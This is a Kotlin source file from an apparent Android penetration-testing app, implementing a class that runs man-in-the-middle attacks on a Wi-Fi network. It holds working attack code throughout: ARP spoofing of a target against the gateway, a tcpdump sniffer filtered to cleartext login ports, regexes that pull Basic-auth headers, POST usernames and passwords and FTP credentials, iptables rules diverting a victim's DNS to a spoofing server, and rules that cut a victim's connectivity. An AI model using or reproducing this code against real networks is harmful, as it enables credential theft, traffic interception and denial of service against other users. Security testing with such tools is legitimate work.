package org.csploit.strix.data

import kotlinx.coroutines.NonCancellable
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import org.csploit.strix.core.ProcessEvent
import org.csploit.strix.core.ProcessManager
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

enum class MitmMode {
    SNIFFER,
    DNS_SPOOF,
    KILL,
}

data class DnsEntry(
    val hostname: String,
    val address: String,
)

/**
 * Orchestrates MITM attacks on Android 13+.
 *
 * Android 13 forwarding requires (discovered empirically on Samsung A12):
 *   - ndc ipfwd enable (not sysctl — netd reverts sysctl)
 *   - iptables -F tetherctrl_FORWARD (removes DROP-all rule that blocks forwarding)
 *     NOTE: do NOT flush the entire filter table (-F) — breaks Android networking
 *     NOTE: do NOT flush raw table (-t raw -F) — removes BPF rules permanently
 *   - iptables -P FORWARD ACCEPT
 *   - iptables -t nat MASQUERADE
 *   - ip route default (Android without SIM may lack default route)
 *   - send_redirects=0 (kernel sends ICMP redirects instead of forwarding)
 *   - ip rule iif wlan0 pref 31500 (Android rule 32000:unreachable drops forwarded pkts)
 *
 * Each command must run as a separate su -c call (single shell scripts don't
 * apply iptables/ndc changes correctly on KernelSU).
 *
 * Setup is idempotent and cleanup restores the device to the state captured in
 * [snapshot] before the first setup ran, so repeated runs never pile up rules
 * nor leave FORWARD policy / send_redirects / ip_forward altered.
 */
@Singleton
class MitmRunner @Inject constructor(
    private val processManager: ProcessManager,
    private val toolManager: ToolManager,
    private val networkManager: NetworkManager,
) {

    /**
     * System values captured before the first setup touched them, so cleanup
     * restores the device exactly. Held until cleanup so a second setup (new
     * run, or another host) doesn't overwrite the originals with our values.
     */
    internal data class NetSnapshot(
        val iface: String,
        val gateway: String,
        val ipForward: String?,
        val sendRedirectsAll: String?,
        val sendRedirectsIface: String?,
        val forwardPolicy: String?,
        val tetherForwardRules: List<String>,
        val addedDefaultRoute: Boolean,
    )

    private data class CommandResult(val code: Int, val stdout: List<String>)

    /** Serializes setup/cleanup so a teardown never interleaves with the next run's setup. */
    private val mutex = Mutex()

    @Volatile
    private var snapshot: NetSnapshot? = null

    fun exec(command: String): Flow<ProcessEvent> {
        return processManager.execute(command = command)
    }

    /**
     * Configure forwarding/NAT for MITM — each command as a separate su -c.
     * Idempotent: our rules are inserted only if absent, so repeated runs
     * never pile up copies. [cleanup] reverts whatever was applied, whether
     * setup finished or was cancelled part-way.
     */
    suspend fun setup(mode: MitmMode, log: (String) -> Unit) = mutex.withLock {
        val net = networkManager.detectNetwork()
            ?: error("No WiFi network detected")
        val iface = net.interfaceName
        val gateway = net.gatewayIp

        if (snapshot == null) {
            snapshot = captureSnapshot(iface, gateway)
        }
        for (cmd in setupCommands(iface, gateway, mode)) {
            log("[+] $cmd")
            run(cmd)
        }
    }

    /**
     * Revert everything [setup] may have changed: our NAT/REDIRECT rules and
     * the policy-routing rule (every copy), the default route if we added it,
     * FORWARD policy, tetherctrl_FORWARD rules, send_redirects, ip_forward.
     * Non-cancellable and safe to call when setup never ran or ran partially.
     */
    suspend fun cleanup(mode: MitmMode) = withContext(NonCancellable) {
        mutex.withLock {
            val snap = snapshot
            val iface = snap?.iface
                ?: networkManager.detectNetwork()?.interfaceName
                ?: "wlan0"
            for (cmd in cleanupCommands(iface, mode)) run(cmd)

            // Restore the surgically-flushed DROP-all rules, but only if netd
            // hasn't already repopulated the chain (e.g. tethering toggled).
            if (snap != null && snap.tetherForwardRules.isNotEmpty()) {
                val current = parseChainRules(run("iptables -S $TETHER_FORWARD").stdout)
                if (current.isEmpty()) {
                    for (rule in snap.tetherForwardRules) run("iptables $rule")
                }
            }

            for (cmd in restoreCommands(snap, iface)) run(cmd)
            snapshot = null
        }
    }

    /**
     * Drop traffic forwarded to/from the victim, killing their connectivity
     * while we keep poisoning their ARP. Idempotent.
     */
    suspend fun applyKillRules(targetIp: String, log: (String) -> Unit) {
        for (cmd in killCommands(targetIp, enable = true)) {
            log("[+] $cmd")
            run(cmd)
        }
    }

    /** Remove every copy of the kill rules for [targetIp]; never cancelled half-way. */
    suspend fun removeKillRules(targetIp: String) = withContext(NonCancellable) {
        for (cmd in killCommands(targetIp, enable = false)) run(cmd)
    }

    /**
     * Start arpspoof (long-running, absolute path, no ProcessManager prefix).
     */
    fun startArpSpoof(targetIp: String): Flow<ProcessEvent> {
        val net = networkManager.detectNetwork()
            ?: error("No WiFi network detected")

        return processManager.execute(
            command = "${toolManager.toolsPath}bin/arpspoof -i ${net.interfaceName} -t $targetIp ${net.gatewayIp}",
        )
    }

    /**
     * Start tcpdump credential sniffer (absolute path).
     */
    fun startCredentialSniffer(targetIp: String): Flow<ProcessEvent> {
        val net = networkManager.detectNetwork()
            ?: error("No WiFi network detected")

        return processManager.execute(
            command = "${toolManager.toolsPath}bin/tcpdump -i ${net.interfaceName} -A -l -s 0 " +
                "'host $targetIp and (port 80 or port 21 or port 23 or port 25 or port 110 or port 143 or port 8080)'",
        )
    }

    /**
     * DNS spoofing on Android is handled by the native Kotlin DnsSpoofServer,
     * not by ettercap. See DnsSpoofServer.kt for rationale (ettercap's
     * dns_spoof plugin needs either -M arp:remote — whose ARP poisoner thread
     * deadlocks on bionic — or active mode to send replies, neither of which
     * works reliably out of the box on Android). The server is wired directly
     * from MitmViewModel; this class only ships the iptables rule that diverts
     * victim traffic to the server.
     */

    // --- command builders (also used by cleanup for symmetry) ---

    /** Insert [rule] (an `iptables` rule body beginning with the table/chain) only if absent. */
    private fun insertIfAbsent(rule: String): String =
        "iptables -C ${rule} 2>/dev/null || iptables -I ${rule}"

    private fun setupCommands(iface: String, gateway: String, mode: MitmMode): List<String> {
        val cmds = mutableListOf(
            "ndc ipfwd enable strix",
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "iptables -F $TETHER_FORWARD",               // remove DROP-all (surgical, not -F)
            "iptables -P FORWARD ACCEPT",
            insertIfAbsent("-t nat POSTROUTING -s 0/0 -j MASQUERADE"),
            "ip route add default via $gateway dev $iface 2>/dev/null; true",
            "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects; echo 0 > /proc/sys/net/ipv4/conf/$iface/send_redirects",
            // ip rule has no -C; the explicit del-before-add keeps it single.
            "ip rule del iif $iface lookup $iface pref 31500 2>/dev/null; " +
                "ip rule add iif $iface lookup $iface pref 31500 2>/dev/null; true",
        )
        if (mode == MitmMode.DNS_SPOOF) {
            cmds.add(insertIfAbsent(dnsRedirectRule(iface)))
        }
        return cmds
    }

    private fun cleanupCommands(iface: String, mode: MitmMode): List<String> {
        val cmds = mutableListOf(
            "ndc ipfwd disable strix",
            "ip rule del iif $iface lookup $iface pref 31500 2>/dev/null; true",
            // delete-until-absent: a prior unbalanced run may have left >1 copy.
            deleteAll("-t nat POSTROUTING -s 0/0 -j MASQUERADE"),
        )
        if (mode == MitmMode.DNS_SPOOF) {
            cmds.add(deleteAll(dnsRedirectRule(iface)))
        }
        return cmds
    }

    private fun restoreCommands(snap: NetSnapshot?, iface: String): List<String> {
        val cmds = mutableListOf<String>()
        snap?.forwardPolicy?.let { cmds.add("iptables -P FORWARD $it") }
        snap?.sendRedirectsAll?.let {
            cmds.add("echo $it > /proc/sys/net/ipv4/conf/all/send_redirects 2>/dev/null; true")
        }
        snap?.sendRedirectsIface?.let {
            cmds.add("echo $it > /proc/sys/net/ipv4/conf/$iface/send_redirects 2>/dev/null; true")
        }
        snap?.ipForward?.let {
            cmds.add("echo $it > /proc/sys/net/ipv4/ip_forward 2>/dev/null; true")
        }
        if (snap?.addedDefaultRoute == true) {
            cmds.add("ip route del default via ${snap.gateway} dev ${snap.iface} 2>/dev/null; true")
        }
        return cmds
    }

    private fun dnsRedirectRule(iface: String): String =
        "-t nat PREROUTING -i $iface -p udp --dport 53 -j REDIRECT --to-ports ${DnsSpoofServer.DEFAULT_PORT}"

    /** Loop a `-D` until iptables reports the rule is gone, removing every copy. */
    private fun deleteAll(rule: String): String =
        "while iptables -C $rule 2>/dev/null; do iptables -D $rule 2>/dev/null || break; done; true"

    private fun killCommands(targetIp: String, enable: Boolean): List<String> {
        val rules = listOf(
            "FORWARD -s $targetIp -p tcp -j REJECT --reject-with tcp-reset",
            "FORWARD -d $targetIp -p tcp -j REJECT --reject-with tcp-reset",
            "FORWARD -s $targetIp -j DROP",
            "FORWARD -d $targetIp -j DROP",
        )
        return rules.map { rule ->
            if (enable) insertIfAbsent(rule) else deleteAll(rule)
        }
    }

    // --- snapshot helpers ---

    private suspend fun captureSnapshot(iface: String, gateway: String): NetSnapshot {
        fun firstLine(r: CommandResult) = r.stdout.firstOrNull()?.trim()
        return NetSnapshot(
            iface = iface,
            gateway = gateway,
            ipForward = sysctlValue(firstLine(run("cat /proc/sys/net/ipv4/ip_forward"))),
            sendRedirectsAll = sysctlValue(firstLine(run("cat /proc/sys/net/ipv4/conf/all/send_redirects"))),
            sendRedirectsIface = sysctlValue(firstLine(run("cat /proc/sys/net/ipv4/conf/$iface/send_redirects"))),
            forwardPolicy = parsePolicy(run("iptables -S FORWARD").stdout),
            tetherForwardRules = parseChainRules(run("iptables -S $TETHER_FORWARD").stdout),
            // No default route now means setup's `ip route add default` created one.
            addedDefaultRoute = run("ip route show default").stdout.none { it.isNotBlank() },
        )
    }

    private fun sysctlValue(raw: String?): String? =
        raw?.trim()?.takeIf { it.all { c -> c.isDigit() } }

    /** Extract the policy from `-P FORWARD ACCEPT` in `iptables -S FORWARD` output. */
    private fun parsePolicy(lines: List<String>): String? =
        lines.firstOrNull { it.startsWith("-P FORWARD ") }
            ?.removePrefix("-P FORWARD ")?.trim()?.takeIf { it.isNotEmpty() }

    /**
     * Turn `iptables -S <chain>` output into re-insertable `-A ...` rule bodies,
     * dropping the `-P`/`-N` chain declarations.
     */
    private fun parseChainRules(lines: List<String>): List<String> =
        lines.filter { it.startsWith("-A ") }

    /** Run one command as its own su -c call, collecting stdout and the exit code. */
    private suspend fun run(command: String): CommandResult {
        val out = mutableListOf<String>()
        var code = 0
        processManager.execute(command = command).collect { event ->
            when (event) {
                is ProcessEvent.StdoutLine -> out.add(event.line)
                is ProcessEvent.StderrLine -> {}
                is ProcessEvent.Exited -> code = event.code
                is ProcessEvent.Killed -> code = 128 + event.signal
            }
        }
        return CommandResult(code, out)
    }

    private fun writeDnsEntries(entries: List<DnsEntry>) {
        val etterDir = File(toolManager.toolsPath, "etc/ettercap")
        val dnsFile = File(etterDir, "etter.dns")
        val content = buildString {
            appendLine("# Generated by Strix — DNS spoof entries")
            for (entry in entries) {
                appendLine("${entry.hostname}\tA\t${entry.address}")
                appendLine("${entry.hostname}\tPTR\t${entry.address}")
            }
        }
        dnsFile.writeText(content)
        dnsFile.setReadable(true, false)
    }

    companion object {
        private const val TETHER_FORWARD = "tetherctrl_FORWARD"

        val BASIC_AUTH_REGEX = Regex(
            """Authorization:\s*Basic\s+(\S+)""", RegexOption.IGNORE_CASE
        )
        val POST_CRED_REGEX = Regex(
            """(?:user(?:name)?|login|email)=([^&\s]+).*?(?:pass(?:word)?|pwd)=([^&\s]+)""",
            RegexOption.IGNORE_CASE,
        )
        val FTP_REGEX = Regex(
            """^(USER|PASS)\s+(.+)""", RegexOption.IGNORE_CASE
        )
    }
}
